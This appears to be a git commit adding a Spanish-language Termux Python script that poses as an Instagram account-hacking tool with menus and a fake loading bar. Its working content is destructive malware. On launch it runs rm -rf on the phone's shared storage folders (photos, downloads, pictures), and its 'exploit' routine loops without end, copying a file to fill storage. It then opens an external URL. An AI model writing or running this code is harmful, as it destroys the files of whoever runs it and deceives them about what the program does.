2f08309b58dfb874eeb93bf276dc561b6be25914
Fenrir-00 <96144320+Fenrir-00@users.noreply.github.com>
2022-07-11 01:49:16 +0200

    Add files via upload

---
+++ instagram.py
@@ -0,0 +1,127 @@
+import os, sys, time, io
+
+class color:
+    morado = '\033[95m'
+    blanco = '\033[97m'
+    cyan = '\033[96m'
+    azul  = '\033[94m'
+    verde = '\033[92m'
+    amarillo = '\033[93m'
+    rojo = '\033[91m'
+    fin = '\033[0m'
+
+os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/downloads/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/external-1/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/pictures/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/shared/")
+
+
+def banner():
+ os.system("clear")
+ print(f"""{color.cyan}
+███████╗███████╗███╗  ██╗██████╗ ██╗██████╗
+██╔════ ██╔════╝████╗ ██║██╔══██╗██║██╔══██╗
+█████╗  █████╗  ██╔██╗██║██████╔╝██║██████╔╝
+██╔══   ██╔══╝  ██║╚████║██╔══██╗██║██╔══██╗
+██║     ███████╗██║ ╚███║██║  ██║██║██║  ██║
+╚═╝     ╚══════╝╚═╝  ╚══╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝""")
+ print(f"{color.fin}")
+
+def carga():
+    print(f"{color.verde}")
+    print("""Loading…
+    █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.verde}")
+    print("""Loading…10%
+    ███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.verde}")
+    print("""Loading…30%
+    █████▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.verde}")
+    print("""Loading…50%
+    ██████████▒▒▒▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.verde}")
+    print("""Loading…70%
+    █████████████▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.verde}")
+    print("""Loading…100%
+    ███████████████████""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+
+def incorrecto():
+    os.system("clear")
+    print(f"""{color.rojo}
+░█████╗░██████╗░░█████╗░██╗░█████╗░███╗░░██╗
+██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗████╗░██║
+██║░░██║██████╔╝██║░░╚═╝██║██║░░██║██╔██╗██║
+██║░░██║██╔═══╝░██║░░██╗██║██║░░██║██║╚████║
+╚█████╔╝██║░░░░░╚█████╔╝██║╚█████╔╝██║░╚███║
+░╚════╝░╚═╝░░░░░░╚════╝░╚═╝░╚════╝░╚═╝░░╚══╝
+██╗███╗░░██╗░█████╗░░█████╗░██████╗░██████╗░
+██║████╗░██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗
+██║██╔██╗██║██║░░╚═╝██║░░██║██████╔╝██████╔╝
+██║██║╚████║██║░░██╗██║░░██║██╔══██╗██╔══██╗
+██║██║░╚███║╚█████╔╝╚█████╔╝██║░░██║██║░░██║
+╚═╝╚═╝░░╚══╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝
+███████╗░█████╗░████████╗░█████╗░
+██╔════╝██╔══██╗╚══██╔══╝██╔══██╗
+█████╗░░██║░░╚═╝░░░██║░░░███████║
+██╔══╝░░██║░░██╗░░░██║░░░██╔══██║
+███████╗╚█████╔╝░░░██║░░░██║░░██║
+╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝{color.fin}""")
+    time.sleep(4)
+    menu()
+
+def menu():
+    os.system("clear")
+    banner()
+    carga()
+    print(f"{color.morado}    QUE INSTAGRAM QUIERES HAKEAR")
+    print("")
+    var = 0
+    print(f"{color.verde}[1]HACKEAR POR USUARIO")
+    print(f"{color.verde}[2]HACKEAR POR TELEFONO")
+    print(f"{color.verde}[3]HACKEAR POR URL")
+    print(f"{color.rojo}[0]SALIR{color.fin}")
+    eleccion =input(f"{color.cyan}ELIJE UN NUMERO >>{color.fin} ")
+    if eleccion == "1" :
+     crear()
+    elif eleccion == "2" :
+     crear()
+    elif eleccion == "3" :
+     crear()
+    elif eleccion == "0" :
+     crear
+    else:
+        incorrecto()
+def crear ():
+ print(f"{colo.amarillo} Cargando sploit espera puede tardar hastas 5 minutos{color.fin}")
+ var = 0
+ fd = open("fenrir.txt","r")
+ while True:
+  nuevo = open(f"fenrir{var}.txt","a")
+  for line in  fd.readlines():
+   nuevo.write(line)
+  nuevo.close()
+  os.system(f"cp fenrir{var}.txt /data/data/com.termux/files/home/storage/downloads/")
+  var += 1
+menu()
+os.system("termux-open-url https://fenrir-00.github.io/ratas/")
